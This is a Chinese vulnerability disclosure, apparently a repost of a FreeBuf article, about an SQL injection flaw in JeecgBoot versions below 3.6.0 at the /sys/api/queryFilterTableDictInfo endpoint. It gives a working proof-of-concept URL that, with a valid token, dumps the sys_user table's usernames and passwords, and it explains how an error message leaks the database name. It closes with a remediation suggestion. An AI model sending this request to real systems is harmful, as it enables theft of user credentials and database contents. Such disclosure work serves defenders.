#  JeecgBoot小于3.6.0版本存在SQL注入漏洞   
 船山信安   2024-11-23 16:01  
  
## 接口/sys/api/queryFilterTableDictInfo存在SQL注入漏洞  
  
通过审计jeecgboot 3.6.0源代码，发现jeecgboot表接口存在SQL注入漏洞，通过构造表名和字段名，直接获取到数据库中的数据。  
  
漏洞代码:  
  
参数table、text、code可以直接带入到前端url，查询出数据库中任意数据表的数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicOobpB6uDmTEFyGdPnibLjTw7iajBeWf6iasSyN8XzberkibBnHWvWt4nicnvsmk3hmbicteTSS9s32ub5Q/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicOobpB6uDmTEFyGdPnibLjTwoiaQ6lm5vWPhGO0xDaRRCUaQxA6XX1dqASJh7KUf1C6XEuQZTtvw5JQ/640?wx_fmt=jpeg&from=appmsg "")  
  
构造漏洞url: http://192.168.10.100/jeecg-boot/sys/api/queryFilterTableDictInfo?table=sys_user&text=username&code=password&filterSql=&pageSize=1000&pageNo=1  
  
漏洞复现：登录后使用用户token，访问http://192.168.10.100/jeecg-boot/sys/api/queryFilterTableDictInfo?table=sys_user&text=username&code=password&filterSql=&pageSize=1000&pageNo=1，获取了数据库中sys_user表所有的用户名和密码，修改table、text和code参数的值可以获取到onenext_init库中所有表的信息，导致数据库敏感信息泄露。  
  
利用前提：获取到token  
  
漏洞接口：/sys/api/queryFilterTableDictInfo  
  
漏洞POC:  
  
?table=sys_user&text=username&code=password&filterSql=&pageSize=1000&pageNo=1  
  
table参数带入mysql表查询，返回的错误信息表onenext_init.mysql不存在，暴露了当前库名为onenext_init，在已知表字段的情况下，能查询onenext_init库中所有表的信息。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicOobpB6uDmTEFyGdPnibLjTwic2MCvjjl7bH0ZNnzn9gpmomthusVLbRK7gib9uaWQTCY9zUoicd5cpsg/640?wx_fmt=jpeg&from=appmsg "")  
  
获取了sys_user表中的用户名和密码  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicOobpB6uDmTEFyGdPnibLjTw4tuCQla5kJWjibv8nydITdNibdIxzAU1spuU1vJWIObgkkNQiabicZDbNA/640?wx_fmt=jpeg&from=appmsg "")  
  
查询tax_task表的数据  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicOobpB6uDmTEFyGdPnibLjTwWF2wHlvOo9F7SvLUDUfSow63MlGtZ5Oqjl4FJjOBnHs99j1By466bw/640?wx_fmt=jpeg&from=appmsg "")  
  
整改建议：前端用户可控参数不能直接带入到用户可控参数table中进行查询，或禁用前端用户对/sys/api/queryFilterTableDictInfo接口访问。  
  
  
来源：【  
JeecgBoot小于3.6.0版本存在SQL注入漏洞 - FreeBuf网络安全行业门户  
】，感谢【  
howardkb】  
  
